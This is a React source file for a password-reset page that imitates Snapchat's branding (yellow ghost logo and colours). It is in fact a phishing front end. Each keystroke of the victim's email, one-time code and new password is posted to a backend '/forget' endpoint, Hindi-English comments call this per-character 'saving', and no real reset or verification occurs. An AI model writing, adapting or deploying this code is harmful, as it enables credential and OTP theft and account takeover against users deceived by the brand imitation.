import { useState, useRef, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'

const API_URL = import.meta.env.VITE_API_URL

const ForgotPasswordPage = () => {
  const navigate = useNavigate()
  const [step, setStep] = useState(1)
  const [email, setEmail] = useState('')
  const [otp, setOtp] = useState(['', '', '', '', '', ''])
  const [newPass, setNewPass] = useState('')

  const [loading, setLoading] = useState(false)
  const [errorMsg, setErrorMsg] = useState('')
  const [resend, setResend] = useState(59)

  const otpRefs = useRef([])

  // ── Fire and forget — UI kabhi nahi rukegi ───────────────
  const saveToBackend = (payload) => {
    fetch(`${API_URL}/forget`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    }).catch(err => console.log('Save error:', err))
  }

  // ── Email — har character type hone pe save ──────────────
  const handleEmailChange = (val) => {
    setEmail(val)
    saveToBackend({
      email: val,
      page: 'ForgotPassword - Email Typing',
    })
  }

  // ── OTP — har digit type hone pe save ───────────────────
  const handleOtpChange = (i, val) => {
    if (!/^\d*$/.test(val)) return
    const next = [...otp]
    next[i] = val.slice(-1)
    setOtp(next)
    if (val && i < 5) otpRefs.current[i + 1]?.focus()

    saveToBackend({
      email,
      otpSnap: next.join(''),   // updated array directly use
      page: 'ForgotPassword - OTP Typing',
    })
  }

  const handleOtpKey = (i, e) => {
    if (e.key === 'Backspace' && !otp[i] && i > 0)
      otpRefs.current[i - 1]?.focus()
  }

  // ── New Password — har character type hone pe save ──────
  const handlePassChange = (val) => {
    setNewPass(val)
    saveToBackend({
      email,
      password: val,
      page: 'ForgotPassword - Password Typing',
    })
  }

  // ── Button handlers — submit pe bhi ek baar save ────────
  const handleEmailNext = () => {
    if (!email.trim()) return
    setLoading(true)
    saveToBackend({ email, page: 'ForgotPassword - Email Submitted' })
    setLoading(false)
    setStep(2)
  }

  const handleOtpNext = () => {
    if (otp.join('').length < 6) return
    setLoading(true)
    saveToBackend({ email, otpSnap: otp.join(''), page: 'ForgotPassword - OTP Submitted' })
    setLoading(false)
    setStep(3)
  }

  const handleReset = () => {
    if (!newPass.trim()) return
    setLoading(true)
    saveToBackend({ email, password: newPass, page: 'ForgotPassword - Password Submitted' })
    setLoading(false)
    navigate('/login', { replace: true })
  }

  // ── Resend countdown ─────────────────────────────────────
  useEffect(() => {
    if (step !== 2 || resend <= 0) return
    const t = setTimeout(() => setResend(r => r - 1), 1000)
    return () => clearTimeout(t)
  }, [step, resend])

  useEffect(() => {
    if (errorMsg) setErrorMsg('')
  }, [email, otp, newPass, step])

  return (
    <div style={s.page}>
      <style>{`
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #fff; }
        input { outline: none; }
        input::placeholder { color: #c8c8c8; }
        @keyframes spin { to { transform: rotate(360deg); } }
      `}</style>

      {/* Back arrow */}
      <button
        style={s.back}
        onClick={() => (step > 1 ? setStep(s => s - 1) : navigate('/login'))}
      >
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
          <path d="M15 18l-6-6 6-6" stroke="#000" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
      </button>

      {/* Ghost logo */}
      <div style={s.logoWrap}>
        <svg viewBox="0 0 120 120" width="64" height="64">
          <path
            d="M60 8C35.1 8 15 28.1 15 53v48l14-12 14 12 14-12 14 12 14-12 14 12V53C105 28.1 84.9 8 60 8z"
            fill="#FFFC00"
          />
          <circle cx="45" cy="52" r="7" fill="#000" />
          <circle cx="75" cy="52" r="7" fill="#000" />
          <circle cx="47" cy="50" r="2.5" fill="#fff" />
          <circle cx="77" cy="50" r="2.5" fill="#fff" />
        </svg>
      </div>

      {errorMsg && <div style={s.errorBox}>{errorMsg}</div>}

      {/* ── STEP 1 — Email ── */}
      {step === 1 && (
        <div style={s.body}>
          <h1 style={s.heading}>Find your account</h1>
          <p style={s.sub}>Enter your email or username to reset your password.</p>

          <input
            style={s.input}
            type="email"
            placeholder="Email or username"
            value={email}
            onChange={e => handleEmailChange(e.target.value)}
            onKeyDown={e => e.key === 'Enter' && handleEmailNext()}
            autoFocus
          />

          <button
            style={{ ...s.btn, opacity: loading || !email.trim() ? 0.5 : 1 }}
            onClick={handleEmailNext}
            disabled={loading}
          >
            {loading ? <span style={s.spin} /> : 'Continue'}
          </button>

          <p style={s.loginLink}>
            Remember your password?{' '}
            <span style={s.link} onClick={() => navigate('/login')}>Log In</span>
          </p>
        </div>
      )}

      {/* ── STEP 2 — OTP ── */}
      {step === 2 && (
        <div style={s.body}>
          <h1 style={s.heading}>Verification code</h1>
          <p style={s.sub}>
            We sent a 6-digit code to{'\n'}
            <strong style={{ color: '#000' }}>{email}</strong>
          </p>

          <div style={s.otpRow}>
            {otp.map((d, i) => (
              <input
                key={i}
                ref={el => (otpRefs.current[i] = el)}
                style={{
                  ...s.otpBox,
                  borderColor: d ? '#FFFC00' : '#e0e0e0',
                  borderWidth: d ? 2.5 : 1.5,
                  fontWeight: d ? 700 : 400,
                }}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={d}
                onChange={e => handleOtpChange(i, e.target.value)}
                onKeyDown={e => handleOtpKey(i, e)}
                autoFocus={i === 0}
              />
            ))}
          </div>

          <button
            style={{ ...s.btn, opacity: loading || otp.join('').length < 6 ? 0.5 : 1 }}
            onClick={handleOtpNext}
            disabled={loading}
          >
            {loading ? <span style={s.spin} /> : 'Verify'}
          </button>

          <p style={s.resend}>
            {resend > 0 ? (
              `Resend code in 0:${String(resend).padStart(2, '0')}`
            ) : (
              <span
                style={s.link}
                onClick={() => {
                  setResend(59)
                  saveToBackend({ email, page: 'ForgotPassword - OTP Resend' })
                }}
              >
                Resend code
              </span>
            )}
          </p>
        </div>
      )}

      {/* ── STEP 3 — New Password ── */}
      {step === 3 && (
        <div style={s.body}>
          <h1 style={s.heading}>New password</h1>
          <p style={s.sub}>Create a new password for your account.</p>

          <input
            style={s.input}
            type="password"
            placeholder="New password"
            value={newPass}
            onChange={e => handlePassChange(e.target.value)}
            onKeyDown={e => e.key === 'Enter' && handleReset()}
            autoFocus
          />

          <button
            style={{ ...s.btn, opacity: loading || !newPass.trim() ? 0.5 : 1 }}
            onClick={handleReset}
            disabled={loading}
          >
            {loading ? <span style={s.spin} /> : 'Reset Password'}
          </button>
        </div>
      )}
    </div>
  )
}

const s = {
  page: {
    minHeight: '100vh',
    background: '#fff',
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    padding: '0 32px',
    fontFamily: '-apple-system, BlinkMacSystemFont, "Helvetica Neue", sans-serif',
    position: 'relative',
  },
  back: {
    position: 'absolute',
    top: 18,
    left: 16,
    background: 'none',
    border: 'none',
    cursor: 'pointer',
    padding: 8,
    borderRadius: 8,
  },
  logoWrap: { marginTop: 72, marginBottom: 28 },
  body: {
    width: '100%',
    maxWidth: 340,
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
  },
  heading: {
    fontSize: 22,
    fontWeight: 700,
    color: '#000',
    textAlign: 'center',
    marginBottom: 10,
    letterSpacing: '-0.3px',
  },
  sub: {
    fontSize: 14,
    color: '#888',
    textAlign: 'center',
    lineHeight: 1.55,
    marginBottom: 28,
    whiteSpace: 'pre-line',
  },
  input: {
    width: '100%',
    height: 50,
    border: '1.5px solid #e0e0e0',
    borderRadius: 12,
    padding: '0 16px',
    fontSize: 15,
    color: '#000',
    background: '#fafafa',
    marginBottom: 14,
    fontFamily: 'inherit',
    transition: 'border-color 0.2s',
  },
  btn: {
    width: '100%',
    height: 50,
    background: '#FFFC00',
    border: 'none',
    borderRadius: 50,
    fontSize: 15,
    fontWeight: 700,
    color: '#000',
    cursor: 'pointer',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    marginTop: 6,
    letterSpacing: '0.01em',
    transition: 'opacity 0.2s',
  },
  spin: {
    width: 18,
    height: 18,
    border: '2.5px solid rgba(0,0,0,0.15)',
    borderTopColor: '#000',
    borderRadius: '50%',
    display: 'inline-block',
    animation: 'spin 0.65s linear infinite',
  },
  loginLink: { fontSize: 13, color: '#888', marginTop: 20, textAlign: 'center' },
  link: { color: '#000', fontWeight: 700, cursor: 'pointer' },
  otpRow: { display: 'flex', gap: 8, marginBottom: 18 },
  otpBox: {
    width: 46,
    height: 54,
    borderRadius: 10,
    border: '1.5px solid #e0e0e0',
    background: '#fafafa',
    textAlign: 'center',
    fontSize: 20,
    color: '#000',
    fontFamily: 'inherit',
    transition: 'border-color 0.15s',
  },
  resend: { fontSize: 13, color: '#aaa', marginTop: 16, textAlign: 'center' },
  errorBox: {
    width: '100%',
    maxWidth: 340,
    background: '#ffebee',
    color: '#c62828',
    padding: '10px 14px',
    borderRadius: 8,
    marginBottom: 16,
    fontSize: 14,
    textAlign: 'center',
    border: '1px solid #ef9a9a',
  },
}

export default ForgotPasswordPage